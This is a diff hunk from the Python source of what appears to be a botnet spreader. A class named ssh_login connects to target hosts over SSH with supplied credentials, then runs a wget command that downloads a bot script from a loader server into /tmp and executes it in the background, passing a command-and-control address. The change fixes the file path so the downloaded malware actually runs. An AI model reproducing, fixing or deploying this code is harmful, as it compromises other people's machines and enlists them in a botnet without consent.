@@ -157,7 +157,7 @@ class ssh_login(Thread):
             s.connect(self._ip, 22, self._uname, self._pwd, timeout=5, auth_timeout=5)
 
             # Download malware from loader and execute.
-            cmd = "wget -O /tmp/bot.py {}:{}/bot_multitry.py;python3 bot.py {} {} &".format(MOD_IP, LOADER_PORT, MOD_IP, OUR_DNS)
+            cmd = "wget -O /tmp/bot.py {}:{}/bot_multitry.py;python3 /tmp/bot.py {} {} &".format(MOD_IP, LOADER_PORT, MOD_IP, OUR_DNS)
             sin, sout, serr = s.exec_command(cmd)
             sout.channel.recv_exit_status()
             print('Login successful using {} {} {}.'.format(self._ip, self._uname, self._pwd))
